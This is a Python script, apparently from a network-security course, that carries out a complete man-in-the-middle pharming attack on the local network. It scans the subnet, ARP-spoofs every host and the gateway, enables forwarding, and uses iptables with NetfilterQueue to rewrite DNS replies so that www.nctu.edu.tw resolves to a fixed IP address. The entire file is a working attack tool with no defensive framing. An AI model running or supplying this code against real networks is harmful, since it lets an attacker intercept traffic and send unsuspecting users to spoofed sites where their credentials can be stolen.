#!/usr/bin/env python3
import os
import sys
import re
import time
from scapy.all import *
from uuid import getnode
import subprocess
from scapy.layers.http import HTTPRequest
from netfilterqueue import NetfilterQueue
import netifaces
TARGET_WEBSITE = '140.113.207.246'
HOME_PAGE = b'www.nctu.edu.tw.'

def forwarding(open):
    os.system('sudo sysctl -w net.ipv4.ip_forward={} > /dev/null 2>&1'.format(str(open)))


def attacker():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	IP = ""
	try:
		s.connect(('8.8.8.8', 1))
		IP = s.getsockname()[0]
	except:
		IP = '127.0.0.1'
	finally:
		s.close()

	mac = getnode()
	mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))   

	return str(IP), str(mac)

def ap(vip,vmac):
	ip = netifaces.gateways()[netifaces.AF_INET][0][0]
	mac = vmac[vip.index(ip)]
	return ip, mac

def scan_net(ip):

	subprocess.run("sudo ip -s -s neigh flush all > /dev/null 2>&1", shell=True)
	prefix_ip = ".".join(ip.split(".")[:3])
	for i in range(255):
		try_ip = prefix_ip+".{}".format(i)
		subprocess.run("sudo arp -d {} > /dev/null 2>&1".format(try_ip), shell=True)
		subprocess.run("ping -c 5 {} > /dev/null 2>&1 &".format(try_ip), shell=True)
	time.sleep(2)

	stream = os.popen('arp -a | grep -v incomplete')

	vip = []
	vmac = []

	lines = stream.readline()

	while lines:
		line = lines.split()
		line[1] = re.sub('[()]', '', line[1])
		vip.append(line[1])
		vmac.append(line[3])
		lines = stream.readline()
	
	sys.stdout.write("{:<20}{:<20}\n".format("IP", "MAC Address"))
	for i in range(len(vip)):
		sys.stdout.write("{:<20}{:<20}\n".format(vip[i], vmac[i]))


	print("\nscan network completed.")
	print("="*23)

	return vip,vmac


def arp():
	attacker_ip, attacker_mac = attacker()

	vip, vmac = scan_net(attacker_ip)
	
	ap_ip, ap_mac = ap(vip,vmac)

	for v in range(len(vip)):
		for i in range(10):
			sendp(Ether(dst=vmac[v], src=attacker_mac)/ARP(pdst=vip[v], psrc=ap_ip, hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
			time.sleep(0.1)

	print("\narp spoffing completed.")
	print("="*23)
	

def iptables_queue():
	subprocess.run('sudo iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 1', shell=True)


def iptables_flush():
	subprocess.run('sudo iptables -F', shell=True)


def pharm():
	nfq = NetfilterQueue()
	nfq.bind(1, handle_queue)
	nfq.run()


def handle_queue(packet):
	pkt = IP(packet.get_payload())
	if pkt[DNS][DNSQR].qname == HOME_PAGE:
		print('phishing')
		pkt[DNS].an = DNSRR(rrname=HOME_PAGE, rdata=TARGET_WEBSITE)
		pkt[DNS].ancount = 1

		del pkt[IP].len
		del pkt[IP].chksum
		del pkt[UDP].len
		del pkt[UDP].chksum

		packet.set_payload(bytes(pkt))

	packet.accept()

try:
	forwarding(1)
	arp()
	iptables_flush()
	iptables_queue()
	pharm()
except KeyboardInterrupt:
	forwarding(0)
	iptables_flush()

